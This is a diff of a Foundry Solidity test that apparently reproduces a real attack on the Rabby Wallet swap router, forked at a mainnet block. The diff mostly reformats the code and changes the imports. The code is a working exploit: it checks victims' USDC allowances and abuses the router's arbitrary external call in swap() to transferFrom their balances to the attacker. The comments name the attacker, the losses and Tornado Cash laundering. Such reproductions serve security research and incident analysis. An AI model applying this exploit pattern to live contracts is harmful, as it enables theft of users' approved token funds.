@@ -2,8 +2,11 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
+import {IERC20} from "OpenZeppelin/interfaces/IERC20.sol";
+
+import {IUSDC} from "src/interfaces/IUSDC.sol";
+import {IUSDT} from "src/interfaces/IUSDT.sol";
 // @KeyInfo - Total Lost : ~200,000 US$
 // Attacker : 0xb687550842a24d7fbc6aad238fd7e0687ed59d55
 // Attack Contract : 0x9682f31b3f572988f93c2b8382586ca26a866475
@@ -40,10 +43,12 @@ import "./../interface.sol";
 // Multiple tokens has been stolen, and 114 ETH deposited to Tornado Cash
 
 contract ContractTest is Test {
-
-    IRabbySwap constant RABBYSWAP_ROUTER = IRabbySwap(0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1);
-    IUSDT constant USDT_TOKEN = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
-    IUSDC constant USDC_TOKEN = IUSDC(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
+    IRabbySwap constant RABBYSWAP_ROUTER =
+        IRabbySwap(0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1);
+    IUSDT constant USDT_TOKEN =
+        IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
+    IUSDC constant USDC_TOKEN =
+        IUSDC(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
 
     function setUp() public {
         vm.createSelectFork("mainnet", 15_724_451);
@@ -54,7 +59,9 @@ contract ContractTest is Test {
 
     function testExploit() public {
         emit log_named_decimal_uint(
-            "[Start] Attacker USDC balance before exploit", USDC_TOKEN.balanceOf(address(this)), 6
+            "[Start] Attacker USDC balance before exploit",
+            USDC_TOKEN.balanceOf(address(this)),
+            6
         );
 
         // Somehow attacker got these EOA addresses that approved the Rabby Wallet Swap Router contract.
@@ -94,13 +101,19 @@ contract ContractTest is Test {
         for (uint256 i; i < victims.length; ++i) {
             // Step 1: Check the victim's USDC balance and allowance to RABBYSWAP_ROUTER
             uint256 vic_balance = USDC_TOKEN.balanceOf(victims[i]);
-            uint256 vic_allowance = USDC_TOKEN.allowance(victims[i], address(RABBYSWAP_ROUTER));
+            uint256 vic_allowance = USDC_TOKEN.allowance(
+                victims[i],
+                address(RABBYSWAP_ROUTER)
+            );
 
             // Step 2: If allowance >= balance: exploit!
             if (vic_allowance >= vic_balance) {
                 // Classic arbitrary external calls `swap()` vulnerability, and the parameter `address dexRouter` is controllable.
                 bytes memory usdc_callbackData = abi.encodeWithSignature(
-                    "transferFrom(address,address,uint256)", victims[i], address(this), vic_balance
+                    "transferFrom(address,address,uint256)",
+                    victims[i],
+                    address(this),
+                    vic_balance
                 );
                 RABBYSWAP_ROUTER.swap(
                     address(USDT_TOKEN),
@@ -116,7 +129,9 @@ contract ContractTest is Test {
         }
 
         emit log_named_decimal_uint(
-            "[End] Attacker USDC balance before exploit", USDC_TOKEN.balanceOf(address(this)), 6
+            "[End] Attacker USDC balance before exploit",
+            USDC_TOKEN.balanceOf(address(this)),
+            6
         );
     }
 
@@ -129,12 +144,10 @@ contract ContractTest is Test {
     }
 
     receive() external payable {}
-
 }
 
 /* -------------------- RabbySwap Interface -------------------- */
 interface IRabbySwap {
-
     function swap(
         address srcToken,
         uint256 amount,
@@ -145,5 +158,4 @@ interface IRabbySwap {
         bytes memory data,
         uint256 deadline
     ) external;
-
 }
